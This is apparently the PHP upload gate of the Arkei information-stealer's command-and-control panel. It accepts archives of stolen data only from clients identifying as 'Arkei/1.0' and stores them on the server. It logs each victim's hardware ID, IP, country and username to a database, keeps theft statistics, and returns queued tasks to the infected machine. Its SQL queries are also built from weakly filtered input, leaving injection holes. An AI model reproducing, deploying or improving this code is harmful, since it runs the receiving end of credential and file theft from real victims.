<?php

if($_SERVER["HTTP_USER_AGENT"] != "Arkei/1.0")
	exit(0);

ini_set("upload_max_filesize", "255M");
ini_set("post_max_size", "256M");

require("../app/config.php");
require('../app/geoip/geoip.php');

$blacklist = array(".php", ".phtml", ".php3", ".php4", ".html", ".htm");

foreach ($blacklist as $item)
    if(preg_match("/$item\$/i", $_FILES['logs']['name'])) exit;

$hwid = checkParam($_POST["hwid"]);
$os = checkParam($_POST["os"]);
$platform = checkParam($_POST["platform"]);
$profile = checkParam($_POST["profile"]);
$count = checkParam($_POST["count"]) - 3;
$username = checkParam($_POST["user"]);
$ip = $_SERVER["REMOTE_ADDR"];

$type = checkParam($_POST["type"]);

if($profile != null)
{		
	$date = date("d/m/Y H:i:s");
	if($os == null){ $os = "Unknown"; }
	if($platform == null){ $os = "Unknown"; }
	$system = $os ." ". $platform; 
	
	$country = ip_code($ip);
	
	$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);
	
	if($database)
	{
		$uploadfile = $config["logs_folder"] ."/". basename($_FILES['logs']['name']);
		
		if (move_uploaded_file($_FILES['logs']['tmp_name'], $uploadfile))
		{
			$database->query("INSERT INTO `logs`(`id`, `hwid`, `system`, `ip`, `country`, `date`, `profile`, `count`, `user`) VALUES ('','$hwid','$system','$ip','$country','$date','$profile','$count','$username')");
			$database->query("UPDATE `stats` SET `Value`=`Value`+1 WHERE `Name`='all_logs'");
			$database->query("UPDATE `stats` SET `Value`=`Value`+". $count ." WHERE `Name`='all_files'");
			$database->query("UPDATE `profiles` SET `Count`=`Count`+1 WHERE `id`='$profile'");
			
			$getTask = $database->query("SELECT `task` FROM `profiles` WHERE `id`='$profile'")->fetch_array();
			echo $getTask["task"];
		}
		else 
		{
			$database->query("UPDATE `stats` SET `Value`=`Value`+1 WHERE `Name`='errors'");
			echo "error";
		}
	}
	else
	{
		echo "error";
	}
	
	mysqli_close($database);
}

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>